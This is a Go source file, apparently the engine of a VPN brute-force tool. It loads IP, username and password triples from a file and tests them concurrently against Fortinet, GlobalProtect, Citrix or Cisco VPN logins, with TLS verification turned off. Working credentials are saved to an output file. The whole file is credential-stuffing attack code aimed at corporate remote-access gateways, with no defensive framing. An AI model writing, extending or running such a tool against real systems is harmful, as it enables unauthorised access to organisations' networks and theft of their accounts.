package bruteforce

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang.org/x/sync/semaphore"
	"vpn-bruteforce-client/internal/config"
	"vpn-bruteforce-client/internal/stats"
)

type Engine struct {
	config       *Config
	stats        *Stats
	client       *http.Client
	semaphore    *semaphore.Weighted
	outputFile   *os.File
	outputMutex  sync.Mutex
	ctx          context.Context
	cancel       context.CancelFunc
	wg           sync.WaitGroup
}

type Credential struct {
	IP       string
	Username string
	Password string
}

func New(cfg *config.Config, statsManager *stats.Stats) (*Engine, error) {
	ctx, cancel := context.WithCancel(context.Background())

	// Create aggressive HTTP client
	transport := &http.Transport{
		MaxIdleConns:        cfg.MaxIdleConns,
		MaxConnsPerHost:     cfg.MaxConnsPerHost,
		IdleConnTimeout:     cfg.IdleConnTimeout,
		TLSHandshakeTimeout: cfg.TLSHandshakeTimeout,
		DisableKeepAlives:   true, // Force close connections
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DialContext: (&net.Dialer{
			Timeout:   cfg.Timeout,
			KeepAlive: 0, // Disable keep-alive
		}).DialContext,
		ForceAttemptHTTP2:     false,
		MaxResponseHeaderBytes: 4096, // Limit response size
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   cfg.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	outputFile, err := os.OpenFile(cfg.OutputFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("failed to open output file: %w", err)
	}

	return &Engine{
		config:    cfg,
		stats:     statsManager,
		client:    client,
		semaphore: semaphore.NewWeighted(int64(cfg.Threads)),
		outputFile: outputFile,
		ctx:       ctx,
		cancel:    cancel,
	}, nil
}

func (e *Engine) Start() error {
	defer e.outputFile.Close()

	// Load credentials
	credentials, err := e.loadCredentials()
	if err != nil {
		return fmt.Errorf("failed to load credentials: %w", err)
	}

	fmt.Printf("📋 Loaded %d credentials\n", len(credentials))
	fmt.Printf("🎯 Target: %s VPN\n", e.config.VPNType)
	fmt.Printf("🔧 Threads: %d (CPU cores: %d)\n\n", e.config.Threads, runtime.NumCPU())

	// Process credentials with worker pool
	credChan := make(chan Credential, 1000)
	
	// Start workers
	for i := 0; i < e.config.Threads; i++ {
		e.wg.Add(1)
		go e.worker(credChan)
	}

	// Feed credentials to workers
	go func() {
		defer close(credChan)
		for _, cred := range credentials {
			select {
			case credChan <- cred:
			case <-e.ctx.Done():
				return
			}
		}
	}()

	// Wait for completion
	e.wg.Wait()
	return nil
}

func (e *Engine) Stop() {
	e.cancel()
}

func (e *Engine) worker(credChan <-chan Credential) {
	defer e.wg.Done()

	for {
		select {
		case cred, ok := <-credChan:
			if !ok {
				return
			}
			e.procesCredential(cred)
		case <-e.ctx.Done():
			return
		}
	}
}

func (e *Engine) procesCredential(cred Credential) {
	// Acquire semaphore
	if err := e.semaphore.Acquire(e.ctx, 1); err != nil {
		return
	}
	defer e.semaphore.Release(1)

	// Create request context with timeout
	ctx, cancel := context.WithTimeout(e.ctx, e.config.Timeout)
	defer cancel()

	var success bool
	var err error

	switch e.config.VPNType {
	case "fortinet":
		success, err = e.checkFortinet(ctx, cred)
	case "globalprotect":
		success, err = e.checkGlobalProtect(ctx, cred)
	case "citrix":
		success, err = e.checkCitrix(ctx, cred)
	case "cisco":
		success, err = e.checkCisco(ctx, cred)
	default:
		e.stats.IncrementErrors()
		return
	}

	if err != nil {
		if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "connection") {
			e.stats.IncrementOffline()
		} else {
			e.stats.IncrementErrors()
		}
		return
	}

	if success {
		e.stats.IncrementGoods()
		e.saveValid(cred)
		if e.config.Verbose {
			fmt.Printf("\n✅ VALID: %s;%s;%s", cred.IP, cred.Username, cred.Password)
		}
	} else {
		e.stats.IncrementBads()
	}
}

func (e *Engine) loadCredentials() ([]Credential, error) {
	file, err := os.Open(e.config.InputFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var credentials []Credential
	scanner := bufio.NewScanner(file)
	
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.Split(line, ";")
		if len(parts) != 3 {
			continue
		}

		credentials = append(credentials, Credential{
			IP:       strings.TrimSpace(parts[0]),
			Username: strings.TrimSpace(parts[1]),
			Password: strings.TrimSpace(parts[2]),
		})
	}

	return credentials, scanner.Err()
}

func (e *Engine) saveValid(cred Credential) {
	e.outputMutex.Lock()
	defer e.outputMutex.Unlock()
	
	line := fmt.Sprintf("%s;%s;%s\n", cred.IP, cred.Username, cred.Password)
	e.outputFile.WriteString(line)
	e.outputFile.Sync() // Force write to disk
}